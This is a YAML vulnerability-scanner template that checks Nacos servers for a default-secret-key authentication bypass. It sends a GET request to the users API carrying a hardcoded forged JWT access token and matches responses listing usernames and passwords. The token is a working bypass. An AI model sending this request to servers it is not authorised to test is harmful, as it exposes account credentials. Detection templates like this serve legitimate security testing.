id: nacos-secret-default-key-unauth

info:
  name: Nacos Default Secret Key Unauthenticated Access
  author: zan8in
  severity: high
  verified: true
  description: |-
    A fixed default secret key may allow access to protected Nacos APIs.
  tags: nacos,unauth
  created: 2024/07/20

rules:
  r0:
    request:
      method: GET
      path: /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=1
    expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
expression: r0()
